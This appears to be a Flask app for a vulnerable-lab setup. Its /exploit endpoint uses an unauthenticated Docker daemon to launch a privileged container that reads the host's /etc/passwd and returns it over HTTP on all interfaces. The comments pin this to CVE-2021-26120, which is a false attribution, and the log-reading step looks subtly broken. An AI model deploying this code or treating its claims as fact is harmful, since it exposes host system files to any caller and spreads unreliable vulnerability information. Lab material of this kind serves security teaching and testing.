from flask import Flask, request, jsonify
import docker
import time
import os

app = Flask(__name__)

# Helper to obtain a Docker client with retry logic
def get_docker_client(retries=30, delay=2):
    for i in range(retries):
        try:
            client = docker.DockerClient(base_url='tcp://docker:2375')
            # Simple ping to verify connectivity
            client.ping()
            return client
        except Exception as e:
            if i < retries - 1:
                time.sleep(delay)
            else:
                raise e
    # Should never reach here
    raise RuntimeError('Unable to connect to Docker daemon')

@app.route('/')
def index():
    return 'Vulnerable app ready. Use /exploit to trigger CVE-2021-26120.'

@app.route('/exploit', methods=['POST'])
def exploit():
    # CVE-2021-26120 allows a privileged container to mount arbitrary host paths.
    # The following code launches a privileged container that mounts the host's /etc/passwd
    # into the container, demonstrating the vulnerability.
    try:
        client = get_docker_client()
        container = client.containers.run(
            image='alpine:3.13',
            command='cat /host_etc/passwd',
            privileged=True,
            detach=True,
            volumes={'/etc/passwd': {'bind': '/host_etc/passwd', 'mode': 'ro'}},
            remove=True
        )
        output = container.logs().decode('utf-8')
        return jsonify({
            'status': 'exploit_executed',
            'output': output
        })
    except Exception as e:
        return jsonify({'error': str(e)}), 500

if __name__ == '__main__':
    # Ensure the app binds to all interfaces
    app.run(host='0.0.0.0', port=5000)